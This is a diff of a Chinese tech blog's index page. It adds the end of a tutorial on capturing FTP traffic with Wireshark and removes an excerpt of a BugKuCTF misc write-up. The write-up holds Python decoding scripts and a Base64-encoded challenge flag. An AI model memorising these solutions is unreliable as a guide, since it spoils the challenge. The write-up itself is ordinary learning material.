+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-16.png" alt="2-16"></p>
+<p>现在我们将 root 用户添加到允许访问名单中，然后再登录试一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-17.png" alt="2-17"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-18.png" alt="2-18"></p>
+<p>可以看到在我们将 roor 用户添加到允许访问名单，并将之在禁止访问名单中去除后，就可以访问 FTP 服务器了，所以证明允许访问和禁止访问的名单还是有生效的。现在我们用 <strong>Wireshark</strong> 抓包来看一下 FTP 协议从建立连接到下载文件的完整过程</p>
+<p>如下图可见TCP的三次握手建立的过程。FTP分为利用TCP和UDP两类，可以看出来我们本次实验使用的是可靠地TCP</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-19.png" alt="2-19"></p>
+<p>可以看到从第981个包开始，客户端向FTP服务器发起请求，这就是我后来的<strong>下载</strong>操作</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-20.png" alt="2-20"></p>
+<p>我们可以选中Protocol类型为FTP-DATA的数据包，右击-&gt;追踪流-&gt;TCP流，来查看完整的TCP流数据</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-21.png" alt="2-21"></p>
+<p>从本TCP流中可看出，都是服务器向客户端发送数据，并且传输的内容为一张gif图片</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-22.png" alt="2-22"></p>
+<p>可以将这个数据流以原始数据的方式保存下来，并命名为 <strong>wireshark.gif</strong></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-23.png" alt="2-23"></p>
+<p>借助工具 <strong>winhex</strong> 将抓取下来的图片的十六进制与我们原本用来测试的 <strong>FTP_Success.gif</strong> 对比一下，不仅可以用gif图片的格式打开查看，而且内容没有半点差异</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-24.png" alt="2-24"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/2-25.png" alt="2-25"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基础知识点</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">展开全文 >></a>
         </p>
       
 
@@ -1989,127 +2172,6 @@
 
 
   
-    <article id="post-BugKuCTF—杂项题 第31-40关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/05/02/BugKuCTF—杂项题 第31-40关/">BugKuCTF — 杂项题(第31-40关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/05/02/BugKuCTF—杂项题 第31-40关/" class="archive-article-date">
-  	<time datetime="2019-05-01T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/04/BugKuCTF%E2%80%94%E6%9D%82%E9%A1%B9%E9%A2%98%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></p>
-<h3 id="第三十一关（convert）"><a href="#第三十一关（convert）" class="headerlink" title="第三十一关（convert）"></a>第三十一关（convert）</h3><p>打开文本看到是<code>二进制</code>文件</p>
-<p>将一整串二进制<code>转换为十六进制</code>，发现开头是<code>rar文件的开头</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/1-1.png" alt="1-1"></p>
-<p>直接保存成一个<code>rar文件</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">s = <span class="string">"010100100110000101110010001000010001101000000111...这里就不全写出来，自行补充即可"</span></span><br><span class="line"></span><br><span class="line">s = hex(int(int(s,<span class="number">2</span>)))[<span class="number">2</span>:]</span><br><span class="line">s = s.encode()</span><br><span class="line">hexvalue = binascii.a2b_hex(s)</span><br><span class="line">rar = open(<span class="string">r'1.rar'</span>,<span class="string">'wb+'</span>)</span><br><span class="line">rar.write(hexvalue)</span><br><span class="line">rar.close()</span><br></pre></td></tr></table></figure>
-<p>解压得到<code>key.txt</code>，查看属性看到一串<code>Base64密文</code></p>
-<p>解密得到flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/1-2.png" alt="1-2"></p>
-<hr>
-<h3 id="第三十二关（听首音乐）"><a href="#第三十二关（听首音乐）" class="headerlink" title="第三十二关（听首音乐）"></a>第三十二关（听首音乐）</h3><p>打开音频文件，发现上面的通道有比较奇怪的信息：<code>一种长的</code>、<code>一种短的</code>，这时想到莫斯密码</p>
-<p>先将信息记录下来（<code>注意：记得每段信息之间要用空格分隔</code>）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/2-1.png" alt="2-1"></p>
-<p>然后拿去在线网站解密一下就得到flag（直接提交就行，不用加格式）</p>
-<p>推荐一个：  <a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">传送门</a></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/2-2.png" alt="2-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/2-3.png" alt="2-3"></p>
-<hr>
-<h3 id="第三十三关（好多数值）"><a href="#第三十三关（好多数值）" class="headerlink" title="第三十三关（好多数值）"></a>第三十三关（好多数值）</h3><p>链接打开看到很多数值，类似<code>坐标</code>，将其赋值下来生成<code>1.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/3-1.png" alt="3-1"></p>
-<p>打开查看，每一行都是RGB值，通过后来的了解是RGB转换成图片，那我们就需要知道图片的长宽</p>
-<p>文本的行数为<code>61366</code>，那么可以分解为：<code>2×61×503</code>，有三种组合方式：<code>122×503</code>、<code>1006×61</code>、<code>2×30683</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/3-3.png" alt="3-3"></p>
-<p>感觉<code>122×503</code>比较靠谱，试一下</p>
-<p>利用Python的图片库，生成一张图片</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">503</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">122</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">"RGB"</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">'1.txt'</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">    line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">    rgb = line.split(<span class="string">","</span>)<span class="comment">#分离rgb</span></span><br><span class="line">    im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
-<p>运行完后会自动弹出图片，图片中写着flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/3-2.png" alt="3-2"></p>
-<hr>
-<h3 id="第三十四关（很普通的数独）"><a href="#第三十四关（很普通的数独）" class="headerlink" title="第三十四关（很普通的数独）"></a>第三十四关（很普通的数独）</h3><p>下载下来一个叫<code>zip</code>的文件，用<code>winhex</code>查看，开头是<code>504b0304</code>，那就是<code>zip格式</code>的文件了，改一下后缀名。解压出来25张图片，是做数独的图片</p>
-<p>将25张图片以<code>5×5</code>排列，发现<code>把有数字的地方涂黑</code>，就是二维码，但是<code>1、5、21</code>这三张图片顺序有问题，如下图：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/4-1.png" alt="4-1"></p>
-<p>然后就可以画出一个二维码。我的方法是建立一个WPS表格，把格子涂黑，比较简单粗暴 :)</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/31-40/4-2.png" alt="4-2"></p>
-<p>网上看了别人的WriteUp：<a href="http://www.pianshen.com/article/4746320544/" target="_blank" rel="noopener">http://www.pianshen.com/article/4746320544/</a></p>
-<p>把<code>有数字的地方作为1，没数字的地方为0</code>，提取出来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">111111101010101000101000001111110000101111111</span><br><span class="line">100000101100111101010011101100011001001000001</span><br><span class="line">101110101110011111010011111101000101001011101</span><br><span class="line">101110101101100010001010000011110001101011101</span><br><span class="line">101110100011100100001111101111111011101011101</span><br><span class="line">...太多了不写</span><br></pre></td></tr></table></figure>
-<p>借用python的<code>Image</code>库，生成二维码，好像也是挺累的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">x = <span class="number">45</span></span><br><span class="line">y = <span class="number">45</span></span><br><span class="line"> </span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>, (x, y))</span><br><span class="line">white = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'file.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">        ff = f.readline()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">            <span class="keyword">if</span> ff[j] == <span class="string">'1'</span>:</span><br><span class="line">                im.putpixel((i, j), black)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                im.putpixel((i, j), white)</span><br><span class="line">im.save(<span class="string">"1.jpg"</span>)</span><br></pre></td></tr></table></figure>
-<p>扫描二维码得到Base64字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9</span><br></pre></td></tr></table></figure>
-<p>多次<code>Base64</code>解码之后，拿到flag</p>
-<p>可能我技术不到位，这道题费时间，比较累</p>
-<hr>
-<h3 id="第三十五关（PEN-AND-APPLE）"><a href="#第三十五关（PEN-AND-APPLE）" class="headerlink" title="第三十五关（PEN_AND_APPLE）"></a>第三十五关（PEN_AND_APPLE）</h3><p>链接打开是一个黑人老哥在跳<code>PEN_AND_APPLE</code>，亮瞎</p>
-<p>没有思路，参考别人的WriteUp：<a href="https://www.cnblogs.com/lomooo/p/5977067.html" target="_blank" rel="noopener">https://www.cnblogs.com/lomooo/p/5977067.html</a></p>
-<p>按照方法去尝试，但是不管怎样都不行，切换操作系统、浏览器、浏览模式下载都不行。好像是因为文件下载下来出了问题，导致隐藏的文件丢失，不做了</p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/05/02/BugKuCTF—杂项题 第31-40关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/Knlvre.github-io/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><span class="page-number current">2</span><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><a class="page-number" href="/Knlvre.github-io/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/3/">Next &raquo;</a>
@@ -2207,15 +2269,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
